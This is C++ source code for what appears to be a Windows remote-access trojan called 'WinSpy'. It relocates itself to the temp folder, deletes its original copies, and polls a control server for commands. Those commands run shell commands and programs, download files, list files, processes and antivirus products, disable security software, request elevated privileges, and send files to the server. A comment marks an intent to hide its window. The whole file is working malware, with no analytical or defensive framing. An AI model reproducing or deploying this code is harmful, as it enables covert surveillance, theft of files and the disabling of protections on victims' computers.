#include <iostream>
#include <filesystem>
#include <windows.h>
#include <chrono>
#include <restclient-cpp/restclient.h>
#include<thread>
#include "utils.h"
#include "Spy.h"
#include "ServerResponse.h"

#define EXE_NAME "WinSpy.exe"
#define DLL_1 "libcurl-d.dll"
#define DLL_2 "zlibd1.dll"
#define SERVER "http://localhost:3000/"

void Incognito(std::filesystem::path);
void SpyUser(std::filesystem::path __dirname);

int main(int argc, const char** argv)
{
	std::filesystem::path __dirname = std::filesystem::path(argv[0]).parent_path();
	if (argc > 1)
	{
		std::filesystem::path rmDir = std::filesystem::path(argv[1]);


		for (const std::filesystem::directory_entry& entry : std::filesystem::directory_iterator(rmDir))
		{
			std::string file = entry.path().filename().string();

			if (!entry.is_directory())
			{
				if (file == DLL_1 || file == DLL_2 || file == EXE_NAME)
				{
					try
					{
						std::filesystem::remove(entry.path());
					}
					catch (const std::exception&) {}
				}
			}
		}

		std::thread com(SpyUser, __dirname);
		com.join();
	}
	else if ((__dirname.string() + "\\") == std::filesystem::temp_directory_path().string())
	{
		std::thread com(SpyUser, __dirname);
		com.join();
	}
	else 
	{
		Incognito(__dirname);
	}

	return 0;
}

void Incognito(std::filesystem::path path)
{
	try
	{
		if (!std::filesystem::exists(std::filesystem::path(std::filesystem::temp_directory_path().string() + DLL_1)))
		{
			std::filesystem::copy(std::filesystem::path(path.string() + "\\" + DLL_1), std::filesystem::path(std::filesystem::temp_directory_path().string() + DLL_1));
		}
		if (!std::filesystem::exists(std::filesystem::path(std::filesystem::temp_directory_path().string() + DLL_2)))
		{
			std::filesystem::copy(std::filesystem::path(path.string() + "\\" + DLL_2), std::filesystem::path(std::filesystem::temp_directory_path().string() + DLL_2));
		}
		if (std::filesystem::exists(std::filesystem::path(std::filesystem::temp_directory_path().string() + EXE_NAME)))
		{
			std::filesystem::remove(std::filesystem::path(std::filesystem::temp_directory_path().string() + EXE_NAME));
		}
		std::filesystem::copy(std::filesystem::path(path.string() + "\\" + EXE_NAME), std::filesystem::path(std::filesystem::temp_directory_path().string() + EXE_NAME));
	}
	catch (const std::exception& e) {}

	ShellExecuteW(NULL, L"open",
		s2ws(std::filesystem::path(std::filesystem::temp_directory_path().string() + EXE_NAME).string()).c_str(),
		s2ws(path.string()).c_str(),
		NULL,
		SW_SHOW); //  SW_HIDE !!!
}

void SpyUser(std::filesystem::path __dirname)
{
	Spy spy = Spy(SERVER, __dirname);
	std::chrono::steady_clock::time_point start = std::chrono::high_resolution_clock::now();
	int lastId = -1;

	while (1)
	{
		std::chrono::steady_clock::time_point current = std::chrono::high_resolution_clock::now();
		if (std::chrono::duration_cast<std::chrono::milliseconds>(current - start).count() >= 1000)
		{
			start = std::chrono::high_resolution_clock::now();

			ServerResponse res = ServerResponse(spy.RequestServer());

			if (res.id != -1 && res.id != lastId)
			{
				lastId = res.id;
				res.arg = res.arg.erase(0, 1);
				if (res.action != NONE)
				{
					switch (res.action)
					{
					case ADMIN:
						spy.RequestAdmin(SE_TCB_NAME);
						break;
					case CMD:
						spy.SendInformation(spy.Command(res.arg));
						break;
					case EXECUTE:
						spy.Execute(res.arg);
						break;
					case DOWNLOAD:
					{
						std::vector<std::string> params = split(res.arg, ' ');
						spy.Download(params[0], params[1]);
					}
					break;
					case FILE_LIST:
					{
						std::vector<std::filesystem::directory_entry> list = spy.GetFileList(std::filesystem::path(res.arg));
						std::string info = "";
						for (std::filesystem::directory_entry entry : list)
						{
							info += entry.path().string() + " " + std::to_string(entry.file_size()) +" + ";
						}
						spy.SendInformation(info);
					}
					break;
					case PROCESS_LIST:
					{
						std::vector<std::string> list = spy.ListProcess();
						std::string info = "";
						for (std::string entry : list)
						{
							info += entry + " + ";
						}
						spy.SendInformation(info);
					}
					break;
					case SECURITY_LIST:
					{
						std::vector<std::string> list = spy.ListAntiVirus();
						std::string info = "";
						for (std::string entry : list)
						{
							info += entry;
						}
						spy.SendInformation(info);
					}
					break;
					case SECURITY_DISABLE:
						spy.DisableSecurity();
						break;
					case CREATE_FILE:
						spy.S_CreateFile(std::filesystem::path(res.arg));
						break;
					case CREATE_DIR:
					{
						std::vector<std::string> params = split(res.arg, ' ');
						spy.S_CreateDir(params[0],
							std::atoi(params[1].c_str()));
					}
					break;
					case GET_PATH:
						spy.GetWindowPath(std::atoi(res.arg.c_str()));
						break;
					case SEND:
					{
						std::vector<std::string> params = split(res.arg, ' ');
						spy.SendFile(params[0],
							std::filesystem::path(params[1]));
					}
						break;
					}
				}
				else 
				{
					if (res.arg == "ping")
					{
						spy.SendInformation("pong");
					}
				}
			}
		}
	}
}